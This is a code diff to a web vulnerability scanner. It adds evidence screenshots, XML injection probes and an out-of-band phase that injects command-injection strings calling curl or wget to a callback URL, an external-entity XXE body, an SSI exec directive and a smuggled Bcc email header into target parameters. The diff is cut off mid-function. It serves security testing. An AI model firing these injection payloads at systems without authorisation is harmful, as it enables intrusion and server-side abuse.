@@ -20472,6 +20472,38 @@ def _capture_xss_screenshot(proof_url: str, out: "OutputManager",
     return ""
 
 
+def _capture_injection_screenshot(proof_url: str, out: "OutputManager",
+                                   phase: str, label: str,
+                                   target: dict, cfg: dict,
+                                   auth_session: "requests.Session | None" = None,
+                                   classification: str = "Injection Evidence",
+                                   title_prefix: str = "Injection Evidence",
+                                   ) -> str:
+    """Take a screenshot of a confirmed injection proof URL.
+
+    Returns the run-dir-relative path to the PNG on success, or empty string.
+    The screenshot is placed in evidence/<phase>/ alongside the HTTP evidence.
+    """
+    _inj_ip = re.sub(r'[^\w]', '_', target.get("ip", "unknown"))
+    safe = re.sub(r'[^\w]', '_', label)[:60]
+    ss_dir = out.root / phase
+    ss_dir.mkdir(parents=True, exist_ok=True)
+    ss_path = ss_dir / f"{safe}_{_inj_ip}_screenshot.png"
+    if _capture_screenshot_to(proof_url, ss_path, target, cfg,
+                              auth_session=auth_session):
+        _register_screenshot(out.root, ss_path, url=proof_url,
+                             ip=target.get("ip", ""), port=target.get("port", 0),
+                             hostname=target.get("hostname", ""),
+                             title=f"{title_prefix}: {label}",
+                             description=f"Evidence screenshot for {label}",
+                             classification=classification)
+        try:
+            return str(ss_path.relative_to(out.root))
+        except Exception:
+            return str(ss_path)
+    return ""
+
+
 _SSO_REDIRECT_DOMAINS = frozenset({
     "login.microsoftonline.com",
     "login.microsoft.com",
@@ -29774,6 +29806,122 @@ def _write_structure_map(out: "OutputManager", target: dict,
         pass
 
 
+# ─────────────────────────────────────────────
+# OOB (Out-of-Band) Testing Helpers
+# ─────────────────────────────────────────────
+_OOB_ENABLED      = False
+_OOB_CALLBACK_URL = ""    # e.g. "https://oob.example.com/c/"
+_OOB_API_URL      = ""    # e.g. "https://crucible:5100/api/oob"
+_OOB_SCAN_ID      = ""
+_OOB_TOKENS: dict = {}    # token -> {"type": str, "url": str, "param": str, "payload_type": str}
+
+
+def _oob_init(cfg: dict, scan_id: str) -> None:
+    """Initialize OOB testing from scan config.
+
+    Expects cfg keys:
+      oob_enabled      (bool)   — master switch
+      oob_callback_url (str)    — base callback URL (the OOB listener)
+      oob_api_url      (str)    — Crucible API for token registration/polling
+    """
+    global _OOB_ENABLED, _OOB_CALLBACK_URL, _OOB_API_URL, _OOB_SCAN_ID, _OOB_TOKENS
+    _OOB_ENABLED      = bool(cfg.get("oob_enabled", False))
+    _OOB_CALLBACK_URL = (cfg.get("oob_callback_url") or "").rstrip("/")
+    _OOB_API_URL      = (cfg.get("oob_api_url") or "").rstrip("/")
+    _OOB_SCAN_ID      = scan_id
+    _OOB_TOKENS       = {}
+    if _OOB_ENABLED:
+        if not _OOB_CALLBACK_URL:
+            vc.log("[oob] oob_enabled=True but no oob_callback_url — disabling OOB", "WARNING")
+            _OOB_ENABLED = False
+        elif not _OOB_API_URL:
+            vc.log("[oob] oob_enabled=True but no oob_api_url — disabling OOB", "WARNING")
+            _OOB_ENABLED = False
+        else:
+            vc.log(f"[oob] OOB testing enabled  callback={_OOB_CALLBACK_URL}  "
+                   f"api={_OOB_API_URL}  scan_id={_OOB_SCAN_ID}", "INFO")
+
+
+def _oob_token() -> str:
+    """Generate a unique OOB token."""
+    import uuid as _uuid_mod
+    return f"fr-{_uuid_mod.uuid4().hex[:16]}"
+
+
+def _oob_callback_url(token: str) -> str:
+    """Build the full callback URL for a given token."""
+    return f"{_OOB_CALLBACK_URL}/{token}"
+
+
+def _oob_register(tokens: dict) -> bool:
+    """Register OOB tokens with the Crucible OOB API.
+
+    tokens: {token_str: {"type": str, "url": str, "param": str, "payload_type": str}}
+    Returns True on success.
+    """
+    global _OOB_TOKENS
+    _OOB_TOKENS.update(tokens)
+    if not _OOB_API_URL:
+        return False
+    try:
+        import requests as _req
+        payload = {
+            "scan_id": _OOB_SCAN_ID,
+            "tokens": {t: v for t, v in tokens.items()},
+        }
+        r = _req.post(f"{_OOB_API_URL}/register",
+                       json=payload, timeout=10, verify=False)
+        if r.status_code == 200:
+            vc.log(f"[oob] Registered {len(tokens)} token(s)", "INFO")
+            return True
+        else:
+            vc.log(f"[oob] Token registration failed: {r.status_code} {r.text[:200]}", "WARNING")
+            return False
+    except Exception as e:
+        vc.log(f"[oob] Token registration error: {e}", "WARNING")
+        return False
+
+
+def _oob_poll() -> list:
+    """Poll the Crucible OOB API for callback hits.
+
+    Returns a list of dicts: [{"token": str, "remote_addr": str, "protocol": str,
+                               "timestamp": str, "raw": str}, ...]
+    """
+    if not _OOB_API_URL:
+        return []
+    try:
+        import requests as _req
+        r = _req.get(f"{_OOB_API_URL}/poll",
+                      params={"scan_id": _OOB_SCAN_ID},
+                      timeout=15, verify=False)
+        if r.status_code == 200:
+            hits = r.json().get("hits", [])
+            if hits:
+                vc.log(f"[oob] Poll returned {len(hits)} hit(s)", "SUCCESS")
+            return hits
+        return []
+    except Exception as e:
+        vc.log(f"[oob] Poll error: {e}", "WARNING")
+        return []
+
+
+def _oob_cleanup() -> None:
+    """Clean up registered OOB tokens."""
+    global _OOB_TOKENS
+    if not _OOB_API_URL or not _OOB_TOKENS:
+        _OOB_TOKENS = {}
+        return
+    try:
+        import requests as _req
+        _req.post(f"{_OOB_API_URL}/cleanup",
+                   json={"scan_id": _OOB_SCAN_ID},
+                   timeout=10, verify=False)
+    except Exception:
+        pass
+    _OOB_TOKENS = {}
+
+
 def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager, sess: requests.Session,
                      crawl_data: dict, fast: bool = False,
@@ -29782,6 +29930,10 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
     phase   = "injection"
     url     = target["url"]
     timeout = cfg.get("timeout", 10)
+    # Initialize OOB testing for this injection phase
+    import uuid as _oob_uuid
+    _oob_init(cfg, _oob_uuid.uuid4().hex[:12])
+
     if waf_cdn:
         vc.log(
             f"[injection] WAF/CDN active ({waf_cdn}) — injection probes may be blocked. "
@@ -29949,6 +30101,10 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                 _title     = ("Injection: SQL Injection (Error-Based) — Confirmed" if _confirmed
                               else "Injection: SQL Injection (Error-Based) — Suspected, unconfirmed")
                 _rq, _rp = _save_http_evidence(out, phase, f"sqli_error_{param}", r, endpoint_url=purl, method="GET")
+                _sqli_get_ss = _capture_injection_screenshot(
+                    purl, out, phase, f"sqli_error_get_{param}",
+                    target, cfg, auth_session=sess,
+                    classification="SQL Injection Evidence", title_prefix="SQLi Error-Based")
                 out.add_finding(
                     title=_title,
                     url=purl, port=target["port"], risk=_risk,
@@ -29960,7 +30116,7 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                                      else "NOTE: '' (escaped) probe ALSO triggers the error — "
                                      "may be page-content noise. Manual confirmation advised.")),
                     output=f"Parameter: {param}\nURL: {purl}",
-                    output_file=f"{_rq},{_rp}",
+                    output_file=f"{_rq},{_rp}" + (f",{_sqli_get_ss}" if _sqli_get_ss else ""),
                     sources="fracture-injection (two-probe gated)", service=target["scheme"],
                     affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                     remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
@@ -30001,6 +30157,10 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                     _title     = ("Injection: SQL Injection (Error-Based) — Confirmed" if _confirmed
                                   else "Injection: SQL Injection (Error-Based) — Suspected, unconfirmed")
                     _rq, _rp = _save_http_evidence(out, phase, f"sqli_form_{pname}", r, endpoint_url=action, method=method)
+                    _sqli_form_ss = _capture_injection_screenshot(
+                        action, out, phase, f"sqli_error_form_{pname}",
+                        target, cfg, auth_session=sess,
+                        classification="SQL Injection Evidence", title_prefix="SQLi Error-Based (Form)")
                     out.add_finding(
                         title=_title,
                         url=action, port=target["port"], risk=_risk,
@@ -30011,7 +30171,7 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                                          if _confirmed else
                                          "NOTE: '' (escaped) probe ALSO triggers error — manual confirmation advised.")),
                         output=f"Form: {action}\nField: {pname}\nConfirmed: {_confirmed}",
-                        output_file=f"{_rq},{_rp}",
+                        output_file=f"{_rq},{_rp}" + (f",{_sqli_form_ss}" if _sqli_form_ss else ""),
                         sources="fracture-injection (two-probe gated)", service=target["scheme"],
                         affected=action, owasp="A03:2025 Injection", nist="SI-10",
                         remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
@@ -30048,13 +30208,17 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                         _sqm_ev = str(_sqm_ev_path)
                     except Exception:
                         pass
+                    _sqli_ss = _capture_injection_screenshot(
+                        sample_url, out, phase, "sqlmap_confirmed",
+                        target, cfg, auth_session=sess,
+                        classification="SQL Injection Evidence", title_prefix="SQLi (sqlmap)")
                     out.add_finding(
                         title="Injection: SQL Injection Confirmed by sqlmap",
                         url=sample_url, port=target["port"], risk="CRITICAL",
                         description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                         output=stdout[:2000], sources="sqlmap",
                         service=target["scheme"],
-                        output_file=_sqm_ev,
+                        output_file=(_sqm_ev + (f",{_sqli_ss}" if _sqli_ss else "")) if _sqm_ev else (_sqli_ss or ""),
                         owasp="A03:2025 Injection", nist="SI-10",
                         remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                     )
@@ -30455,12 +30619,16 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                           headers={"Content-Type": "application/xml"})
             if re.search(r'root:.*:/bin/', r.text):
                 _rq, _rp = _save_http_evidence(out, phase, "xxe", r, endpoint_url=action, method="POST")
+                _xxe_ss = _capture_injection_screenshot(
+                    action, out, phase, "xxe_confirmed",
+                    target, cfg, auth_session=sess,
+                    classification="XXE Evidence", title_prefix="XXE Injection")
                 out.add_finding(
                     title="Injection: XML External Entity (XXE) Injection",
                     url=action, port=target["port"], risk="CRITICAL",
                     description=f"XXE injection confirmed at {action}. /etc/passwd content was returned.",
                     output=r.text[:500],
-                    output_file=f"{_rq},{_rp}",
+                    output_file=f"{_rq},{_rp}" + (f",{_xxe_ss}" if _xxe_ss else ""),
                     sources="fracture-injection", service=target["scheme"],
                     affected=action, owasp="A03:2025 Injection", nist="SI-10",
                     remediation="Disable external entity processing in XML parsers.",
@@ -30469,6 +30637,114 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                 vc.log(f"[injection] XXE at {action}", "SUCCESS")
         except Exception:
             pass
+
+    # 8b. Generic XML Injection (non-XXE structure injection)
+    _XML_INJECT_PAYLOADS = [
+        # Tag injection — if reflected unescaped, confirms XML structure injection
+        ('<fracture_xml_test attr="injected"/>', re.compile(r'<fracture_xml_test\b', re.I)),
+        # CDATA breakout — escaping CDATA context
+        (']]><fracture_cdata/><![CDATA[', re.compile(r'<fracture_cdata', re.I)),
+        # Processing instruction injection
+        ('<?fracture_pi test?>', re.compile(r'<\?fracture_pi', re.I)),
+    ]
+    _XML_PARSER_ERROR_RE = re.compile(
+        r'(?:XMLSyntaxError|SAXParseException|XmlException|'
+        r'XML\s+(?:parse|parsing)\s+error|'
+        r'not\s+well-?formed|'
+        r'invalid\s+XML|'
+        r'org\.xml\.sax|'
+        r'javax\.xml|'
+        r'lxml\.etree|'
+        r'simplexml_load|'
+        r'DOMParser|'
+        r'REXML::ParseException)',
+        re.I,
+    )
+    for form in forms[:10]:
+        action = form.get("action", url)
+        for xml_pay, xml_detect in _XML_INJECT_PAYLOADS:
+            try:
+                # Send as application/xml body
+                _xml_r = sess.post(action, data=xml_pay, timeout=timeout,
+                                   headers={"Content-Type": "application/xml"})
+                if _xml_r and xml_detect.search(_xml_r.text):
+                    _xml_rq, _xml_rp = _save_http_evidence(
+                        out, phase, "xml_inject", _xml_r,
+                        endpoint_url=action, method="POST")
+                    _xml_ss = _capture_injection_screenshot(
+                        action, out, phase, "xml_injection",
+                        target, cfg, auth_session=sess,
+                        classification="XML Injection Evidence",
+                        title_prefix="XML Injection")
+                    out.add_finding(
+                        title="Injection: XML Injection",
+                        url=action, port=target["port"], risk="MEDIUM",
+                        description=(
+                            f"XML structure injection confirmed at {action}. "
+                            f"User-supplied XML tags are incorporated into the "
+                            f"server's XML document without sanitisation, allowing "
+                            f"an attacker to manipulate document structure, inject "
+                            f"processing instructions, or escalate to XXE."
+                        ),
+                        output=f"Payload: {xml_pay}\nReflected in response",
+                        output_file=f"{_xml_rq},{_xml_rp}" + (
+                            f",{_xml_ss}" if _xml_ss else ""),
+                        sources="fracture-injection", service=target["scheme"],
+                        affected=action, owasp="A03:2025 Injection", nist="SI-10",
+                        remediation=(
+                            "Validate and sanitise all XML input using a "
+                            "whitelist-based approach. Use XML schema validation "
+                            "to reject unexpected elements and attributes. "
+                            "Encode user input before embedding in XML documents."
+                        ),
+                        http_code=_xml_r.status_code,
+                        cwe=["CWE-91"],
+                        cvss_score=5.3,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                    )
+                    vc.log(f"[injection] XML injection at {action}", "SUCCESS")
+                    break
+                # Also check for parser errors (even if tag not reflected)
+                if _xml_r and _XML_PARSER_ERROR_RE.search(_xml_r.text):
+                    _xml_rq2, _xml_rp2 = _save_http_evidence(
+                        out, phase, "xml_parser_error", _xml_r,
+                        endpoint_url=action, method="POST")
+                    _xml_pe_ss = _capture_injection_screenshot(
+                        action, out, phase, "xml_parser_error",
+                        target, cfg, auth_session=sess,
+                        classification="XML Injection Evidence",
+                        title_prefix="XML Parser Error")
+                    out.add_finding(
+                        title="Injection: XML Injection (Parser Error)",
+                        url=action, port=target["port"], risk="LOW",
+                        description=(
+                            f"XML parser error exposed at {action}. "
+                            f"The server reveals internal XML processing details "
+                            f"when receiving malformed XML input. This information "
+                            f"assists an attacker in crafting XXE or XML injection "
+                            f"payloads."
+                        ),
+                        output=f"Payload: {xml_pay}\nParser error in response: "
+                               f"{_xml_r.text[:500]}",
+                        output_file=f"{_xml_rq2},{_xml_rp2}" + (
+                            f",{_xml_pe_ss}" if _xml_pe_ss else ""),
+                        sources="fracture-injection", service=target["scheme"],
+                        affected=action, owasp="A05:2025 Security Misconfiguration",
+                        nist="SI-11",
+                        remediation=(
+                            "Suppress XML parser error details in production "
+                            "responses. Return a generic error message and log "
+                            "the details server-side only."
+                        ),
+                        http_code=_xml_r.status_code,
+                        cwe=["CWE-209"],
+                        cvss_score=3.7,
+                        cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                    )
+                    vc.log(f"[injection] XML parser error at {action}", "INFO")
+                    break
+            except Exception:
+                pass
 
     # 9. Second-order SQL injection
     vc.status(phase, "Injection Testing", "running", "Second-order SQLi", 10, 28)
@@ -30486,6 +30762,10 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                 r2 = sess.get(action, timeout=timeout)
                 if r2 and _SQL_ERROR_RE.search(r2.text):
                     _rq, _rp = _save_http_evidence(out, phase, f"sqli_so_{pname}", r2, endpoint_url=action, method="POST")
+                    _so_sqli_ss = _capture_injection_screenshot(
+                        action, out, phase, f"sqli_second_order_{pname}",
+                        target, cfg, auth_session=sess,
+                        classification="SQL Injection Evidence", title_prefix="Second-Order SQLi")
                     out.add_finding(
                         title="Injection: Second-Order SQL Injection",
                         url=action, port=target["port"], risk="CRITICAL",
@@ -30493,7 +30773,7 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                                      f"A quote character stored in the field triggered a SQL error on the "
                                      f"next retrieval, indicating the stored value is interpolated unsafely."),
                         output=f"Field: {pname}\nStore payload: fracture_so_sqli'\nSQL error on retrieval",
-                        output_file=f"{_rq},{_rp}",
+                        output_file=f"{_rq},{_rp}" + (f",{_so_sqli_ss}" if _so_sqli_ss else ""),
                         sources="fracture-injection", service=target["scheme"],
                         affected=action, owasp="A03:2025 Injection", nist="SI-10",
                         remediation="Use parameterised queries for all database operations, including reads of stored values.",
@@ -30594,12 +30874,16 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                     continue
                 if r and nosql_err.search(_nosql_body):
                     _rq, _rp = _save_http_evidence(out, phase, f"nosql_{param}", r, endpoint_url=purl, method="GET")
+                    _nosql_ss = _capture_injection_screenshot(
+                        purl, out, phase, f"nosql_{param}",
+                        target, cfg, auth_session=sess,
+                        classification="NoSQL Injection Evidence", title_prefix="NoSQL Injection")
                     out.add_finding(
                         title="Injection: NoSQL Injection",
                         url=purl, port=target["port"], risk="CRITICAL",
                         description="User-supplied input is incorporated into NoSQL query documents without type or operator validation, allowing an attacker to manipulate query logic and bypass authentication or exfiltrate data.",
                         output=f"Parameter: {param}\nPayload: {nosql_pay}\nResponse ({r.status_code}): {r.text[:300]}",
-                        output_file=f"{_rq},{_rp}",
+                        output_file=f"{_rq},{_rp}" + (f",{_nosql_ss}" if _nosql_ss else ""),
                         sources="fracture-injection", service=target["scheme"],
                         affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                         remediation="Use parameterised query APIs or ODM/ORM frameworks that reject user-supplied operator tokens; enforce strict type validation on all inputs used in query construction.",
@@ -30669,13 +30953,17 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                 r = _qs_inject(purl, param, xpath_pay, sess, timeout)
                 if r and xpath_err.search(r.text):
                     _rq, _rp = _save_http_evidence(out, phase, f"xpath_{param}", r, endpoint_url=purl, method="GET")
+                    _xpath_ss = _capture_injection_screenshot(
+                        purl, out, phase, f"xpath_{param}",
+                        target, cfg, auth_session=sess,
+                        classification="XPath Injection Evidence", title_prefix="XPath Injection")
                     out.add_finding(
                         title="XPath Injection",
                         url=purl, port=target["port"], risk="HIGH",
                         description=(f"XPath injection detected in parameter '{param}' with payload "
                                      f"'{xpath_pay}'. Error response reveals XPath expression construction."),
                         output=f"Parameter: {param}\nPayload: {xpath_pay}\nResponse ({r.status_code}): {r.text[:300]}",
-                        output_file=f"{_rq},{_rp}",
+                        output_file=f"{_rq},{_rp}" + (f",{_xpath_ss}" if _xpath_ss else ""),
                         sources="fracture-injection", service=target["scheme"],
                         affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                         remediation="Use a parameterised XPath API. Never concatenate user input into XPath expressions.",
@@ -30740,6 +31028,10 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                         '', _hpp_body, flags=re.I)
                     if "fracture_hpp_probe" in _hpp_body:
                         _rq, _rp = _save_http_evidence(out, phase, f"hpp_{param}", r, endpoint_url=purl, method="GET")
+                        _hpp_ss = _capture_injection_screenshot(
+                            purl, out, phase, f"hpp_{param}",
+                            target, cfg, auth_session=sess,
+                            classification="HPP Evidence", title_prefix="HTTP Parameter Pollution")
                         out.add_finding(
                             title="HTTP Parameter Pollution (HPP)",
                             url=purl, port=target["port"], risk="MEDIUM",
@@ -30747,7 +31039,7 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                                          f"Sending the parameter twice caused the second value to be reflected, "
                                          f"indicating the application processes duplicated parameters inconsistently."),
                             output=f"Parameter: {param}\nTest URL: {hpp_url}\nSecond value reflected in response",
-                            output_file=f"{_rq},{_rp}",
+                            output_file=f"{_rq},{_rp}" + (f",{_hpp_ss}" if _hpp_ss else ""),
                             sources="fracture-injection", service=target["scheme"],
                             affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                             remediation="Define explicit single-value semantics for all parameters. Reject or normalise duplicate query parameters.",
@@ -30976,6 +31268,10 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                             [{"url": purl, "req": str(_bsqli_rq), "resp": str(_bsqli_rp)}])
                     except Exception:
                         pass
+                    _bsqli_ss = _capture_injection_screenshot(
+                        purl, out, phase, f"sqli_bool_{param}",
+                        target, cfg, auth_session=sess,
+                        classification="SQL Injection Evidence", title_prefix="Blind SQLi (Boolean)")
                     out.add_finding(
                         title="Injection: Blind SQL Injection (Boolean-Based)",
                         url=purl, port=target["port"], risk="CRITICAL",
@@ -30984,7 +31280,7 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                                 f"TRUE payload: {_bool_sqli_true} → {r_true.status_code} ({len(r_true.text)} bytes)\n"
                                 f"FALSE payload: {_bool_sqli_false} → {r_false.status_code} ({len(r_false.text)} bytes)"),
                         sources="fracture-injection", service=target["scheme"],
-                        output_file=_bsqli_ev,
+                        output_file=(_bsqli_ev + (f",{_bsqli_ss}" if _bsqli_ss else "")) if _bsqli_ev else (_bsqli_ss or ""),
                         affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                         remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                     )
@@ -31042,6 +31338,10 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                                 [{"url": purl, "req": str(_tsqli_rq), "resp": str(_tsqli_rp)}])
                         except Exception:
                             pass
+                        _tsqli_ss = _capture_injection_screenshot(
+                            purl, out, phase, f"sqli_time_{param}",
+                            target, cfg, auth_session=sess,
+                            classification="SQL Injection Evidence", title_prefix="Blind SQLi (Time-Based)")
                         out.add_finding(
                             title="Injection: Blind SQL Injection (Time-Based)",
                             url=purl, port=target["port"], risk="CRITICAL",
@@ -31050,7 +31350,7 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                                     f"Response time: {elapsed:.2f}s (baseline: {_bl_elapsed:.2f}s, "
                                     f"delta: {_delta:.2f}s, threshold: {delay}s)"),
                             sources="fracture-injection", service=target["scheme"],
-                            output_file=_tsqli_ev,
+                            output_file=(_tsqli_ev + (f",{_tsqli_ss}" if _tsqli_ss else "")) if _tsqli_ev else (_tsqli_ss or ""),
                             affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                             remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                         )
@@ -31435,6 +31735,12 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
         _hpp_all_ev: list = []
         for h in _hpp_found:
             _hpp_all_ev.extend(h["evidence"])
+        _hpp_refl_ss = _capture_injection_screenshot(
+            _hpp_found[0]["url"], out, phase, "hpp_reflected",
+            target, cfg, auth_session=sess,
+            classification="HPP Evidence", title_prefix="HPP Reflected")
+        if _hpp_refl_ss:
+            _hpp_all_ev.append(_hpp_refl_ss)
         out.add_finding(
             title="HTTP Parameter Pollution (Reflected)",
             url=_hpp_found[0]["url"], port=target["port"], risk="MEDIUM",
@@ -31557,6 +31863,288 @@ def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                 vc.log(f"[injection] toxicache: {len(_tc_unkeyed)} unkeyed headers at {url}", "INFO")
         except Exception as e:
             out.log_error("toxicache", tc_cmd, str(e))
+
+    # 27. OOB Testing Phase — blind out-of-band interaction tests
+    if _OOB_ENABLED:
+        vc.status(phase, "Injection Testing", "running", "OOB (blind interaction)", 27, 28)
+        vc.log("[oob] Starting out-of-band blind interaction tests", "INFO")
+        import time as _oob_time
+        _oob_tokens_batch: dict = {}  # token -> metadata
+
+        # Build payloads for each URL/endpoint
+        _oob_test_urls = [e["url"] for e in params[:8]]
+        if url and url not in _oob_test_urls:
+            _oob_test_urls.insert(0, url)
+
+        for _oob_url in _oob_test_urls[:10]:
+            _check_pause()
+            _oob_parsed = urllib.parse.urlparse(_oob_url)
+
+            # --- Blind SSRF: inject callback URL in various params ---
+            for _oob_entry in params[:5]:
+                if _oob_entry["url"] != _oob_url:
+                    continue
+                for _oob_param in _oob_entry.get("params", [])[:5]:
+                    _ssrf_tok = _oob_token()
+                    _ssrf_cb = _oob_callback_url(_ssrf_tok)
+                    _oob_tokens_batch[_ssrf_tok] = {
+                        "type": "blind_ssrf", "url": _oob_url,
+                        "param": _oob_param, "payload_type": "query_param",
+                    }
+                    try:
+                        _qs_inject(_oob_url, _oob_param, _ssrf_cb, sess, timeout)
+                    except Exception:
+                        pass
+
+            # --- Blind XXE: POST XML with external entity ---
+            _xxe_tok = _oob_token()
+            _xxe_cb = _oob_callback_url(_xxe_tok)
+            _oob_tokens_batch[_xxe_tok] = {
+                "type": "blind_xxe", "url": _oob_url,
+                "param": "__body__", "payload_type": "xml_entity",
+            }
+            _xxe_oob_payload = (
+                f'<?xml version="1.0"?><!DOCTYPE foo '
+                f'[<!ENTITY xxe SYSTEM "{_xxe_cb}">]>'
+                f'<foo>&xxe;</foo>'
+            )
+            try:
+                sess.post(_oob_url, data=_xxe_oob_payload, timeout=timeout,
+                          headers={"Content-Type": "application/xml"})
+            except Exception:
+                pass
+
+            # --- Blind CMDi: backtick/subshell with curl/wget to callback ---
+            for _oob_entry in params[:5]:
+                if _oob_entry["url"] != _oob_url:
+                    continue
+                for _oob_param in _oob_entry.get("params", [])[:3]:
+                    _cmdi_tok = _oob_token()
+                    _cmdi_cb = _oob_callback_url(_cmdi_tok)
+                    _oob_tokens_batch[_cmdi_tok] = {
+                        "type": "blind_cmdi", "url": _oob_url,
+                        "param": _oob_param, "payload_type": "command_subshell",
+                    }
+                    for _cmdi_pay in [
+                        f"`curl {_cmdi_cb}`",
+                        f"$(wget -q -O- {_cmdi_cb})",
+                        f";curl {_cmdi_cb};",
+                        f"|curl {_cmdi_cb}|",
+                    ]:
+                        try:
+                            _qs_inject(_oob_url, _oob_param, _cmdi_pay, sess, timeout)
+                        except Exception:
+                            pass
+                    break  # one param per URL for CMDi
+
+            # --- SMTP Header Injection: inject callback domain in email fields ---
+            _email_params = {"email", "mail", "to", "from", "cc", "bcc",
+                             "recipient", "sender", "reply-to", "replyto"}
+            for form in forms[:5]:
+                _f_action = form.get("action", _oob_url)
+                _f_inputs = form.get("inputs", [])
+                for inp in _f_inputs:
+                    _inp_name = (inp.get("name") or "").lower()
+                    if _inp_name in _email_params:
+                        _smtp_tok = _oob_token()
+                        _smtp_cb = _oob_callback_url(_smtp_tok)
+                        _oob_tokens_batch[_smtp_tok] = {
+                            "type": "smtp_header", "url": _f_action,
+                            "param": _inp_name, "payload_type": "email_header",
+                        }
+                        _smtp_data = {i["name"]: i.get("value", "test")
+                                      for i in _f_inputs if i.get("name")}
+                        _smtp_data[inp["name"]] = (
+                            f"test@test.com\r\nBcc: oob@"
+                            f"{urllib.parse.urlparse(_smtp_cb).hostname}"
+                        )
+                        try:
+                            sess.post(_f_action, data=_smtp_data, timeout=timeout)
+                        except Exception:
+                            pass
+                        break
+
+            # --- SSI: inject SSI directives with callback URL ---
+            _ssi_tok = _oob_token()
+            _ssi_cb = _oob_callback_url(_ssi_tok)
+            _oob_tokens_batch[_ssi_tok] = {
+                "type": "ssi", "url": _oob_url,
+                "param": "__body__", "payload_type": "ssi_directive",
+            }
+            for _oob_entry in params[:3]:
+                if _oob_entry["url"] != _oob_url:
+                    continue
+                for _oob_param in _oob_entry.get("params", [])[:2]:
+                    _ssi_pay = f'<!--#exec cmd="curl {_ssi_cb}" -->'
+                    try:
+                        _qs_inject(_oob_url, _oob_param, _ssi_pay, sess, timeout)
+                    except Exception:
+                        pass
+                break
+
+        # Register ALL tokens with Crucible
+        if _oob_tokens_batch:
+            _oob_register(_oob_tokens_batch)
+            vc.log(f"[oob] Waiting 15s for OOB callbacks ({len(_oob_tokens_batch)} tokens) ...", "INFO")
+            _oob_time.sleep(15)
+
+            # Poll for hits
+            _oob_hits = _oob_poll()
+            for hit in _oob_hits:
+                _hit_token = hit.get("token", "")
+                _hit_meta = _OOB_TOKENS.get(_hit_token, {})
+                if not _hit_meta:
+                    continue
+                _hit_type = _hit_meta.get("type", "unknown")
+                _hit_url = _hit_meta.get("url", "")
+                _hit_param = _hit_meta.get("param", "")
+                _hit_remote = hit.get("remote_addr", "")
+                _hit_proto = hit.get("protocol", "")
+                _hit_ts = hit.get("timestamp", "")
+
+                _oob_desc_base = (
+                    f"Out-of-band interaction detected from {_hit_url} "
+                    f"(parameter: {_hit_param}). The server made an external "
+                    f"request to the OOB callback at {_hit_ts} from {_hit_remote} "
+                    f"via {_hit_proto}."
+                )
+
+                if _hit_type == "blind_ssrf":
+                    out.add_finding(
+                        title="External Service Interaction (HTTP)",
+                        url=_hit_url, port=target["port"], risk="CRITICAL",
+                        description=(
+                            _oob_desc_base + " This confirms the application can be "
+                            "coerced into making arbitrary server-side HTTP requests, "
+                            "enabling access to internal services, cloud metadata "
+                            "endpoints, and other resources behind the firewall."
+                        ),
+                        output=(f"OOB Type: Blind SSRF\nParameter: {_hit_param}\n"
+                                f"Callback from: {_hit_remote}\nProtocol: {_hit_proto}"),
+                        sources="fracture-oob", service=target["scheme"],
+                        affected=_hit_url, owasp="A10:2025 Server-Side Request Forgery (SSRF)",
+                        nist="SC-7",
+                        remediation=(
+                            "Validate and whitelist all URLs the application fetches. "
+                            "Block access to internal/private IP ranges and cloud "
+                            "metadata endpoints from server-side HTTP clients. "
+                            "Use a dedicated egress proxy for outbound requests."
+                        ),
+                        cwe=["CWE-918"],
+                        cvss_score=9.1,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                    )
+                    vc.log(f"[oob] BLIND SSRF confirmed: {_hit_url} param={_hit_param}", "SUCCESS")
+
+                elif _hit_type == "blind_xxe":
+                    out.add_finding(
+                        title="Injection: Blind XML External Entity (XXE)",
+                        url=_hit_url, port=target["port"], risk="CRITICAL",
+                        description=(
+                            _oob_desc_base + " The XML parser resolved an external "
+                            "entity pointing to the OOB callback, confirming blind XXE. "
+                            "An attacker can exfiltrate files, perform SSRF, or cause "
+                            "denial of service via entity expansion."
+                        ),
+                        output=(f"OOB Type: Blind XXE\nParameter: {_hit_param}\n"
+                                f"Callback from: {_hit_remote}\nProtocol: {_hit_proto}"),
